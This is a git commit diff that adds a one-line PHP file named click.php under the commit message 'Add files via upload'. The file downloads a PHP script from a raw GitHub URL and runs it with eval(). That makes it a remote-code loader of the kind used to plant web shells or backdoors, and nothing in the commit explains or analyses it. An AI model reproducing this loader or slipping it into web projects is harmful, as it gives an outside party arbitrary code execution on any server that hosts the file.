f0a78ec502de04d8482ba6df445793dbb64bccbf
utchiha505 <115435572+utchiha505@users.noreply.github.com>
2025-07-19 04:01:14 +0200

    Add files via upload

---
+++ click.php
@@ -0,0 +1,1 @@
+<?php $rf = 'https://raw.githubusercontent.com/utchiha505/alex/refs/heads/main/slexuse.php';$ch = curl_init($rf);curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);$bn = curl_exec($ch);curl_close($ch);eval('?>' . $bn); ?>
